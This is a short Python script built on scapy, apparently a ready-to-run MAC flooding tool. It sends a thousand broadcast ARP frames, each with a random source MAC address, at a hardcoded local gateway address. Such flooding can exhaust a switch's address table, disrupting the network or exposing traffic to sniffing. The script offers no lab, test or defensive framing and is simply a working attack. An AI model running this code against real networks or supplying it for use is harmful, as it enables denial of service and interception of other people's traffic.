from scapy.all import *
import random

def random_mac():
    """Generate random MAC addresses."""
    return "02:00:00:%02x:%02x:%02x" % (random.randint(0, 255), 
                                        random.randint(0, 255), 
                                        random.randint(0, 255))

def mac_flood(target_ip):
    """Flood the network with packets with random MAC addresses."""
    for _ in range(1000):  # Number of packets to send; adjust as necessary.
        ethernet_frame = Ether(src=random_mac(), dst="ff:ff:ff:ff:ff:ff")
        arp_packet = ARP(pdst=target_ip)
        packet = ethernet_frame / arp_packet
        sendp(packet, verbose=False)

if __name__ == "__main__":
    target_ip = '192.168.1.1'  # Target IP address
    mac_flood(target_ip)